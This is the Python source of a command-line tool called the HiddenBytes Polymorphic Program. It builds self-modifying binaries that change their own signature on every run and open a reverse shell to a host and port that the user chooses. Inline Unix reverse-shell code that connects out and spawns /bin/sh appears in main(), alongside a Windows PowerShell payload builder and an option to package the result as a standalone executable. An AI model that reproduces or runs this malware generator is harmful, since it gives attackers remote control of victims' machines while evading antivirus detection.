"""
Command-line interface for the Polymorphic Program (Windows).

Usage:
    polymorph --generate <output> --payload default --host <IP> --port <PORT>
"""

import argparse
import os
import sys
import tempfile

from hiddenbytes.polymorph.engine import (
    PolymorphicEngine,
    build_reverse_shell_payload,
)

BANNER = r"""
 _____       _                   _       _     _
|  __ \     | |                 | |     | |   | |
| |__) |___ | | ___  _ __ ___  | | ___ | |__ | |__
|  ___// _ \| |/ _ \| '_ ` _ \ | |/ _ \| '_ \| '_ \
| |  | (_) | | (_) | | | | | || | (_) | |_) | |_) |
|_|   \___/|_|\___/|_| |_| |_||_|\___/|_.__/|_.__/
  ____                                            _
 |  _ \                                          | |
 | |_) |_ __ ___  _ __ ___   ___  _ __ ___   ___ | |
 |  _ <| '__/ _ \| '_ ` _ \ / _ \| '_ ` _ \ / _ \| |
 | |_) | | | (_) | | | | | | (_) | | | | | | (_) | |
 |____/|_|  \___/|_| |_| |_|\___/|_| |_| |_|\___/|_|

            P O L Y M O R P H I C   P R O G R A M
"""


def parse_args(argv=None):
    """Parse command-line arguments for the Polymorphic Program."""
    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(
        prog='polymorph',
        description='HiddenBytes Polymorphic Program - Generate '
                    'self-modifying binaries.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  polymorph --generate polymorphic.py --payload default
  polymorph --generate shell.py --host 10.0.0.5 --port 5555
  polymorph --generate shell.exe --host 10.0.0.5 --port 5555 --standalone
        """
    )

    parser.add_argument(
        '--generate',
        metavar='<output-binary>',
        required=True,
        help='Path where the polymorphic binary will be generated.'
    )
    parser.add_argument(
        '--payload',
        metavar='<reverse-shell-code>',
        default='default',
        help='Path to a file containing the reverse shell payload code, '
             'or "default" for the built-in payload.'
    )
    parser.add_argument(
        '--host',
        metavar='<ip-address>',
        default='192.168.1.100',
        help='IP address for the reverse shell (default: 192.168.1.100).'
    )
    parser.add_argument(
        '--port',
        metavar='<port>',
        type=int,
        default=4444,
        help='Port for the reverse shell (default: 4444).'
    )
    parser.add_argument(
        '--unix',
        action='store_true',
        default=False,
        help='Generate Unix-compatible payload (/bin/sh) instead of Windows PowerShell.'
    )

    # Only show --standalone when not running inside a PyInstaller bundle
    if not getattr(sys, 'frozen', False):
        parser.add_argument(
            '--standalone',
            action='store_true',
            default=False,
            help='Bundle the output into a standalone executable (requires PyInstaller).'
        )
    else:
        # Define a hidden attribute so the rest of the code doesn't crash
        parser.add_argument(
            '--standalone',
            action='store_true',
            default=False,
            help=argparse.SUPPRESS
        )

    return parser.parse_args(argv)


def main(argv=None):
    """Entry point for the Polymorphic Program."""
    print(BANNER)

    args = parse_args(argv)

    # Resolve payload code
    if args.payload and args.payload.lower() != 'default':
        if not os.path.isfile(args.payload):
            print("[ERROR] Payload file '" + args.payload + "' not found.")
            sys.exit(1)
        with open(args.payload, 'r') as f:
            payload_code = f.read()
        print("[*] Loaded payload from: " + args.payload)
    else:
        if args.unix:
            payload_code = (
                "import socket, subprocess, os\n"
                "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                "s.connect((" + repr(args.host) + ", " + str(args.port) + "))\n"
                "os.dup2(s.fileno(), 0)\n"
                "os.dup2(s.fileno(), 1)\n"
                "os.dup2(s.fileno(), 2)\n"
                'subprocess.call(["/bin/sh", "-i"])\n'
            )
        else:
            payload_code = build_reverse_shell_payload(
                args.host, args.port
            )
        print("[*] Using built-in reverse shell payload")
        print("[*] Target: " + args.host + ":" + str(args.port))

    print("[*] Output file: " + args.generate)
    print("[*] Unix mode: " + ("Yes" if args.unix else "No (Windows PowerShell)"))
    print("[*] Standalone executable: " + ("Yes" if args.standalone else "No"))
    print()

    print("[*] Generating polymorphic binary...")
    engine = PolymorphicEngine(payload_code, args.generate)

    if args.standalone:
        # Check if running inside a PyInstaller bundle
        if getattr(sys, 'frozen', False):
            print("[ERROR] --standalone is not available inside this pre-built binary.")
            print("[INFO] Use --standalone when running the tool from source with PyInstaller installed.")
            print("[INFO] To generate the polymorphic script instead, omit --standalone:")
            print("       " + os.path.basename(sys.argv[0]) + " --generate " + args.generate + " --payload default [options]")
            sys.exit(1)

        fd, tmp_script = tempfile.mkstemp(suffix=".py", prefix="hb_polymorph_")
        os.close(fd)
        engine.output_path = tmp_script
        engine.generate(args.host, args.port)

        print()
        print("[*] Building standalone executable via PyInstaller...")

        try:
            from hiddenbytes.common.builder import build_standalone
        except ImportError:
            print("[ERROR] PyInstaller is required for --standalone mode.")
            print("[INFO] Install it with: pip install pyinstaller")
            print("       or: pip install 'hiddenbytes[standalone]'")
            sys.exit(1)
        final_path = build_standalone(tmp_script, args.generate)

        os.remove(tmp_script)

        final_size = os.path.getsize(final_path)
        print("[SUCCESS] Standalone executable created: '" + final_path + "'")
        print("[INFO] File size: " + str(final_size) + " bytes ("
              + str(final_size / (1024 * 1024)) + " MB)")
        print()
        print("[*] To execute the polymorphic binary (will attempt reverse shell), run:")
        print("    " + final_path)
        print()
    else:
        engine.generate(args.host, args.port)

        print("[+] Polymorphic binary generated successfully as '" + args.generate + "'")
        print("[+] File size: " + str(os.path.getsize(args.generate)) + " bytes")
        print()
        print("[*] To execute the polymorphic binary, run:")
        print("    python " + args.generate)
        print()
        print("[*] On each execution, the binary will:")
        print("    1. Modify its own source code (change signature)")
        print("    2. Attempt to connect the reverse shell")
        print()


if __name__ == "__main__":
    main()
